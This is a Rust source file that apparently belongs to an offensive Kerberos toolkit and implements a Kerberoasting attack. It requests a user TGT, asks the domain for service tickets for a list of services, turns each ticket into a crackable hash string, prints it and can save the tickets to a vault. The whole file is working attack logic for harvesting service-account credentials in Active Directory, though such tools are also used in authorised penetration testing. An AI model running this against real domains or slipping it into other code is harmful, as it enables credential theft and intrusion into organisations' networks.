use crate::core::CredFormat;
use crate::core::KrbUser;
use crate::core::Vault;
use crate::core::{get_user_tgt, request_tgs};
use crate::core::{tgs_to_crack_string, CrackFormat, S4u2options};
use crate::error::Result;
use crate::communication::KrbChannel;
use kerberos_crypto::Key;
use log::info;

pub fn kerberoast(
    user: KrbUser,
    services: Vec<String>,
    in_vault: &mut dyn Vault,
    out_vault: Option<&dyn Vault>,
    user_key: Option<&Key>,
    channel: &dyn KrbChannel,
    cred_format: CredFormat,
    crack_format: CrackFormat,
    etype: Option<i32>,
) -> Result<()> {
    let username = user.name.clone();
    let tgt = get_user_tgt(
        user.clone(),
        user_key,
        etype,
        in_vault,
        channel,
    )?;

    let mut tickets = in_vault.dump()?;

    for service in services {
        match request_tgs(
            user.clone(),
            user.realm.clone(),
            tgt.clone(),
            S4u2options::Normal(service.clone()),
            etype.map(|e| vec![e]),
            channel,
        ) {
            Err(err) => match &err {
                _ => return Err(err),
            },
            Ok(tgs) => {
                let crack_str = tgs_to_crack_string(
                    &username,
                    &service,
                    &tgs.ticket,
                    crack_format,
                );
                println!("{}", crack_str);
                tickets.push(tgs);
            }
        }
    }

    if let Some(out_vault) = out_vault {
        info!("Save {} TGSs in {}", username, out_vault.id());
        out_vault.save_as(tickets, cred_format)?;
    }
    return Ok(());
}
